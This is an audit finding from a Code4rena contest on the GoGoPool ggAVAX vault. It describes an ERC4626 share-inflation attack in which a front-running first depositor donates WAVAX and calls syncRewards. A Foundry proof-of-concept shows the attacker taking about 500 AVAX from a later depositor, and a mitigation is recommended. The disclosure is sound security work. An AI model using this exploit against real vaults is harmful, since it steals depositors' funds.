# Original link
https://github.com/code-423n4/2022-12-gogopool-findings/issues/209
# Lines of code

https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123


# Vulnerability details

## Impact

Inflation of `ggAVAX` share price can be done by depositing as soon as the vault is created.

Impact:
1. Early depositor will be able steal other depositors funds
2. Exchange rate is inflated. As a result depositors are not able to deposit small funds.

## Proof of Concept

If `ggAVAX` is not seeded as soon as it is created, a malicious depositor can deposit 1 WEI of AVAX to receive 1 share. 
The depositor can donate WAVAX to the vault and call `syncRewards`. This will start inflating the price.

When the attacker front-runs the creation of the vault, the attacker: 
1. Calls `depositAVAX` to receive 1 share
2. Transfers `WAVAX` to `ggAVAX`
3. Calls `syncRewards` to inflate exchange rate

The issue exists because the exchange rate is calculated as the ratio between the `totalSupply` of shares and the `totalAssets()`.
When the attacker transfers `WAVAX` and calls `syncRewards()`, the `totalAssets()` increases gradually and therefore the exchange rate also increases.

`convertToShares `:
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123
```
	function convertToShares(uint256 assets) public view virtual returns (uint256) {
		uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.

		return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
	}
```

Its important to note that while it is true that cycle length is 14 days, in practice time between cycles can very between 0-14 days.
This is because syncRewards validates that the next reward cycle is evenly divided by the length (14 days).

`syncRewards`:
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L102
```
	function syncRewards() public {
----------
		// Ensure nextRewardsCycleEnd will be evenly divisible by `rewardsCycleLength`.
		uint32 nextRewardsCycleEnd = ((timestamp + rewardsCycleLength) / rewardsCycleLength) * rewardsCycleLength;
---------
	}
```

Therefore:
- The closer the call to `syncRewards` is to the next evenly divisible value of `rewardsCycleLength`, the closer the next  `rewardsCycleEnd` will be. 
- The closer the delta between `syncRewards` calls is, the higher revenue the attacker will get.

Edge case example: 
`syncRewards` is called with the timestamp 1672876799, `syncRewards` will be able to be called again 1 second later.
`(1672876799 + 14 days) / 14 days) * 14 days) = 1672876800`

Additionally, the price inflation causes a revert for users who want to deposit less then the donation (WAVAX transfer) amount, due to precision rounding when depositing.

`depositAVAX`:
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L166
```
	function depositAVAX() public payable returns (uint256 shares) {
------
		if ((shares = previewDeposit(assets)) == 0) {
			revert ZeroShares();
		}
------
	}
```

`previewDeposit` and `convertToShares `:
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L133
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123
```
	function convertToShares(uint256 assets) public view virtual returns (uint256) {
		uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.

		return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
	}
	function previewDeposit(uint256 assets) public view virtual returns (uint256) {
		return convertToShares(assets);
	}
```

### Foundry POC

The POC will demonstrate the below scenario:
1. Bob front-runs the vault creation.
2. Bob deposits 1 WEI of AVAX to the vault.
3. Bob transfers 1000 WAVAX to the vault.
4. Bob calls `syncRewards` when block.timestamp = `1672876799`.
5. Bob waits 1 second.
6. Bob calls `syncRewards` again. Share price fully inflated.
7. Alice deposits 2000 AVAX to vault.
8. Bob withdraws 1500 AVAX (steals 500 AVAX from Alice).
9. Alice share earns her 1500 AVAX (although she deposited 2000).

Additionally, the POC will show that depositors trying to deposit less then the donation amount will revert. 

Add the following test to `TokenggAVAX.t.sol`:
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/TokenggAVAX.t.sol#L108
```
	function testShareInflation() public {
		uint256 depositAmount = 1;
		uint256 aliceDeposit = 2000 ether;
		uint256 donationAmount = 1000 ether;
		vm.deal(bob, donationAmount  + depositAmount);
		vm.deal(alice, aliceDeposit);
		vm.warp(1672876799);

		// create new ggAVAX
		ggAVAXImpl = new TokenggAVAX();
		ggAVAX = TokenggAVAX(deployProxy(address(ggAVAXImpl), address(guardian)));
		ggAVAX.initialize(store, ERC20(address(wavax)));

		// Bob deposits 1 WEI of AVAX
		vm.prank(bob);
		ggAVAX.depositAVAX{value: depositAmount}();
		// Bob transfers 1000 AVAX to vault
		vm.startPrank(bob);
		wavax.deposit{value: donationAmount}();
		wavax.transfer(address(ggAVAX), donationAmount);
		vm.stopPrank();
		// Bob Syncs rewards
		ggAVAX.syncRewards();

		// 1 second has passed
		// This can range between 0-14 days. Every seconds, exchange rate rises
		skip(1 seconds);

		// Alice deposits 2000 AVAX
		vm.prank(alice);
		ggAVAX.depositAVAX{value: aliceDeposit}();

		//Expectet revert when any depositor deposits less then 1000 AVAX
		vm.expectRevert(bytes4(keccak256("ZeroShares()")));
		ggAVAX.depositAVAX{value: 10 ether}();

		// Bob withdraws maximum assests for his share
		uint256 maxWithdrawAssets = ggAVAX.maxWithdraw(bob);
		vm.prank(bob);
		ggAVAX.withdrawAVAX(maxWithdrawAssets);

		//Validate bob has withdrawn 1500 AVAX 
		assertEq(bob.balance, 1500 ether);

		// Alice withdraws maximum assests for her share
		maxWithdrawAssets = ggAVAX.maxWithdraw(alice);
		ggAVAX.syncRewards(); // to update accounting
		vm.prank(alice);
		ggAVAX.withdrawAVAX(maxWithdrawAssets);

		// Validate that Alice withdraw 1500 AVAX + 1 (~500 AVAX loss)
		assertEq(alice.balance, 1500 ether + 1);
	}
```

To run the POC, execute:
```
forge test -m testShareInflation -v
```

Expected output:
```
Running 1 test for test/unit/TokenggAVAX.t.sol:TokenggAVAXTest
[PASS] testShareInflation() (gas: 3874399)
Test result: ok. 1 passed; 0 failed; finished in 8.71s
```

## Tools Used

VS Code, Foundry

## Recommended Mitigation Steps

When creating the vault add initial funds in order to make it harder to inflate the price. 
Best practice would add initial funds as part of the initialization of the contract (to prevent front-running).